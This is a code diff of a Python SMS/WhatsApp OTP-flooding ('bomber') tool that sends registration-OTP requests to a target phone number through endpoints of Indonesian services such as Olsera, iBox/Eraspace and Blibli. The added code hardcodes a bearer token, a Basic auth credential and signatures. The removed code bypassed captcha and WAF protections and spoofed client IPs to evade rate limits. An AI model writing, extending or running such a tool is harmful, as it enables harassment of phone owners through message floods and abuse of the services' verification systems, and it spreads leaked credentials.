@@ -46,13 +46,17 @@ console = Console()
 # ══════════════════════════════════════════════════════════════
 
 APIS = {
-    1: {"name": "PlanetBan",   "desc": "WhatsApp",  "tag": "PLB",
-        "cooldown": 60, "color": "bright_red",    "method": "planetban"},
-    2: {"name": "DuniaGames",  "desc": "OTP SMS",   "tag": "DNG",
-        "cooldown": 60, "color": "bright_yellow",  "method": "duniagames"},
-    3: {"name": "MokaPos",     "desc": "OTP WA",    "tag": "MKP",
-        "cooldown": 60, "color": "bright_magenta", "method": "mokapos"},
-    4: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
+    1: {"name": "PlanetBan",   "desc": "OTP WA",    "tag": "PLB",
+        "cooldown": 60, "color": "bright_red",     "method": "planetban"},
+    2: {"name": "Olesera",     "desc": "OTP SMS",   "tag": "OLS",
+        "cooldown": 60, "color": "bright_green",   "method": "olesera"},
+    3: {"name": "iBox",        "desc": "OTP WA",    "tag": "IBX",
+        "cooldown": 60, "color": "bright_blue",    "method": "ibox"},
+    4: {"name": "BliBli SMS",  "desc": "OTP SMS",   "tag": "BLS",
+        "cooldown": 60, "color": "bright_yellow",  "method": "bliblisms"},
+    5: {"name": "BliBli WA",   "desc": "OTP WA",    "tag": "BLW",
+        "cooldown": 60, "color": "bright_magenta", "method": "blibli"},
+    6: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
         "cooldown": 0,  "color": "bold cyan",      "method": "all"},
 }
 
@@ -306,17 +310,6 @@ def _get_plb_scraper() -> cloudscraper.CloudScraper:
         )
     return _plb_scraper
 
-# ── Cloudscraper session singleton untuk MokaPos (bypass x-captcha / CF WAF)
-_mkp_scraper: cloudscraper.CloudScraper | None = None
-
-def _get_mkp_scraper() -> cloudscraper.CloudScraper:
-    """Buat atau kembalikan cloudscraper session untuk MokaPos."""
-    global _mkp_scraper
-    if _mkp_scraper is None:
-        _mkp_scraper = cloudscraper.create_scraper(
-            browser={"browser": "chrome", "platform": "android", "desktop": False}
-        )
-    return _mkp_scraper
 
 def send_planetban(phone: str) -> dict:
     num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
@@ -380,102 +373,107 @@ def send_planetban(phone: str) -> dict:
 
     return {"status": last_code, "body": last_body}
 
-def send_duniagames(phone: str) -> dict:
-    num  = phone if phone.startswith("62") else "62" + phone.lstrip("0")
-    plus = "+62" + num[2:]
-    user = "0"  + num[2:]
-
-    payload = json.dumps({"phoneNumber": plus, "userName": user})
-    hdrs = _h(
-        **{
-            "Content-Type":     "application/json",
-            "ciam-type":        "FR",
-            "x-device":         str(uuid.uuid4()),
-            "origin":           "https://duniagames.co.id",
-            "referer":          "https://duniagames.co.id/",
-            "x-requested-with": "com.chimbori.hermitcrab",
-            "sec-fetch-site":   "same-site",
-        }
-    )
+def send_olesera(phone: str) -> dict:
+    payload = json.dumps({"use_otp_type": 3})
+    hdrs = _h(**{
+        "Content-Type":     "application/json",
+        "authorization":    "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6ImMzN2FlMjY1ODA0ODU0OWQ1MGQyN2FhODc3NTdjN2EwYWRiZDg4YmU1NmM0NTFhNjM2ZTMwMmY0NjNkNjEyYmIwNWQxMDdmNmVlZDU0Y2UxIn0.eyJhdWQiOiIyIiwianRpIjoiYzM3YWUyNjU4MDQ4NTQ5ZDUwZDI3YWE4Nzc1N2M3YTBhZGJkODhiZTU2YzQ1MWE2MzZlMzAyZjQ2M2Q2MTJiYjA1ZDEwN2Y2ZWVkNTRjZTEiLCJpYXQiOjE3ODUzNDM1NzQsIm5iZiI6MTc4NTM0MzU3NCwiZXhwIjoxNzg1NDI5OTc0LCJzdWIiOiI5ODYxMjQiLCJzY29wZXMiOltdfQ.ly3_99ytakq4VOMnRdhq7xgjNFI83o6Mkoktk-n7_4BhtKP-g1_EmFkeMXidSm6Lw2sjBKa_ty5bVjKuFQC56461AiBsxpx_F94XeUegYRBqBoJ2NRZXLf9uyAYSSss2lrRWo-baM2ZmZdtSNmdqbhUvfXI148J25D5E1lV98DH4ztR7W4iEkei4KwEyWLqlK_X0kr2BEzQOL93k-f2GiHsvxmEMzkE_-gZyvaJa9EHzjaBbVPB6f43wVcRVcUbTmJ4wykipw3YgC2eW2wVySXTL-pmletMxYDxlxJblwQeOQV9vPqYAwEDf7gB3f4F6BbLfGA5PcJjtGIIO5oZtUTFUEhzG6PHlvvTi2AiF4o9yUiffJjK16ho6bmIneP6jfnPpo9P7XT5SZ7Q9Dvf1fQmAr-C91apKkYCGGV1TNIsl7OJzEMSc1vAd4im9Oh8VaGQnKj9wLYZgZPWnjoUnkI5dtd0rxpMI7__26-nD4pw3nt9eUlb_UcHk1QdROfjmV2ebCdYQvLDBtcuAZcQOCeenX_YWhkTtA9rD3mSBcOQ1AuwxDkLJgjlOal5jJRxknVGEGLVWJcLaVv2Wu_78n5RlOgdKU7Vz81HnSxzg32q1olX1qWa9jawBqCSzTUnY7HoxkIUuWCCqHz92UN41sXT5ZI8bQRY3PszIFY0HaAs",
+        "origin":           "https://olsera.com",
+        "referer":          "https://olsera.com/",
+        "x-requested-with": "com.chimbori.hermitcrab",
+        "sec-fetch-site":   "cross-site",
+    })
     return safe_post(
-        "https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
+        "https://api-dash.olsera.co.id/api/admin/v1/id/send-otp-register-v2",
         headers=hdrs, data=payload,
     )
 
 
-def send_mokapos(phone: str) -> dict:
-    """Kirim OTP MokaPos — cloudscraper bypass x-captcha / CF WAF otomatis."""
+def send_ibox(phone: str) -> dict:
+    num  = phone if phone.startswith("62") else "62" + phone.lstrip("0")
+    payload = json.dumps({"identifier": num, "type": "identifier_validation"})
+    hdrs = _h(**{
+        "Content-Type":     "application/json",
+        "otp-client":       "eraspace",
+        "authorization":    "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
+        "otp-provider":     "whatsapp",
+        "signature":        "d607efec1821aeed379b895eb05489d492d609c9f70ea8254b2606adc1c0e63a",
+        "source":           "ibox",
+        "device-id":        str(uuid.uuid4()),
+        "sms-client":       "eraspace",
+        "origin":           "https://ibox.co.id",
+        "referer":          "https://ibox.co.id/",
+        "x-requested-with": "com.chimbori.hermitcrab",
+        "sec-fetch-site":   "cross-site",
+    })
+    return safe_post(
+        "https://jeanne.eraspace.com/customers/v2.1/otp/request",
+        headers=hdrs, data=payload,
+    )
+
+
+def send_bliblisms(phone: str) -> dict:
     num  = phone if phone.startswith("62") else "62" + phone.lstrip("0")
     plus = "+62" + num[2:]
+    payload = json.dumps({
+        "action":         "REGISTER_OTP",
+        "channel":        "SMS",
+        "recipient":      plus,
+        "recaptchaToken": "",
+        "challengeToken": "",
+    })
+    hdrs = _h(**{
+        "Content-Type":     "text/plain",
+        "x-request-id":     str(uuid.uuid4()),
+        "x-channel-id":     "MWEB",
+        "x-lang":           "id",
+        "x-entity":         "DEKORUMA",
+        "x-client-id":      "3c90f67b0b7bad6d6e1d51fdd26f1d97",
+        "origin":           "https://account.bliblitiket.com",
+        "referer":          "https://account.bliblitiket.com/",
+        "x-requested-with": "com.chimbori.hermitcrab",
+        "sec-fetch-site":   "same-origin",
+    })
+    return safe_post(
+        "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate",
+        headers=hdrs, data=payload,
+    )
 
-    payload  = json.dumps({"phone_number": plus})
-    last_code, last_body = 0, ""
 
-    for attempt in range(3):
-        try:
-            ip   = rand_ip()
-            hdrs = {
-                "Content-Type":     "application/json",
-                "Accept":           "application/json, text/plain, */*",
-                "Accept-Language":  random.choice([
-                    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "id-ID,id;q=0.9,en;q=0.8",
-                ]),
-                "authorization":    "undefined",
-                "origin":           "https://backoffice.mokapos.com",
-                "referer":          "https://backoffice.mokapos.com/",
-                "x-requested-with": "com.chimbori.hermitcrab",
-                "sec-fetch-site":   "same-site",
-                "sec-fetch-mode":   "cors",
-                "sec-fetch-dest":   "empty",
-                "X-Forwarded-For":  ip,
-                "X-Real-IP":        ip,
-                "X-Originating-IP": rand_ip(),
-            }
-
-            if attempt > 0:
-                global _mkp_scraper
-                _mkp_scraper = None   # reset session → CF token segar
-                time.sleep(random.uniform(1.5, 3.0) * attempt)
-
-            scraper = _get_mkp_scraper()
-            r = scraper.post(
-                "https://service-goauth.mokapos.com/account/v1/verification/phone/sendc",
-                headers=hdrs, data=payload, timeout=20,
-            )
-            last_code = r.status_code
-            last_body = r.text
-
-            if is_ok(r.status_code):
-                return {"status": r.status_code, "body": r.text}
-
-            if r.status_code == 429:
-                wait = float(r.headers.get("Retry-After",
-                             random.uniform(3, 7) * (attempt + 1)))
-                time.sleep(min(wait, 15))
-                continue
-
-            if r.status_code == 403:
-                # 403 → CF/captcha masih blokir → reset session
-                _mkp_scraper = None
-                time.sleep(random.uniform(2.0, 4.0))
-                continue
-
-            return {"status": r.status_code, "body": r.text}
-
-        except Exception as e:
-            last_code = 0
-            last_body = str(e)
-            _mkp_scraper = None
-            time.sleep(1.5)
-
-    return {"status": last_code, "body": last_body}
+def send_blibli(phone: str) -> dict:
+    num  = phone if phone.startswith("62") else "62" + phone.lstrip("0")
+    plus = "+62" + num[2:]
+    payload = json.dumps({
+        "action":         "REGISTER_OTP",
+        "channel":        "WHATS_APP",
+        "recipient":      plus,
+        "recaptchaToken": "",
+        "challengeToken": "",
+    })
+    hdrs = _h(**{
+        "Content-Type":     "text/plain",
+        "x-request-id":     str(uuid.uuid4()),
+        "x-channel-id":     "MWEB",
+        "x-lang":           "id",
+        "x-entity":         "DEKORUMA",
+        "x-client-id":      "3c90f67b0b7bad6d6e1d51fdd26f1d97",
+        "origin":           "https://account.bliblitiket.com",
+        "referer":          "https://account.bliblitiket.com/",
+        "x-requested-with": "com.chimbori.hermitcrab",
+        "sec-fetch-site":   "same-origin",
+    })
+    return safe_post(
+        "https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate",
+        headers=hdrs, data=payload,
+    )
 
 
 def dispatch(method: str, phone: str) -> dict:
     if method == "planetban":  return send_planetban(phone)
-    if method == "duniagames": return send_duniagames(phone)
-    if method == "mokapos":    return send_mokapos(phone)
+    if method == "olesera":    return send_olesera(phone)
+    if method == "ibox":       return send_ibox(phone)
+    if method == "bliblisms":  return send_bliblisms(phone)
+    if method == "blibli":     return send_blibli(phone)
     return {}
 
 # ══════════════════════════════════════════════════════════════
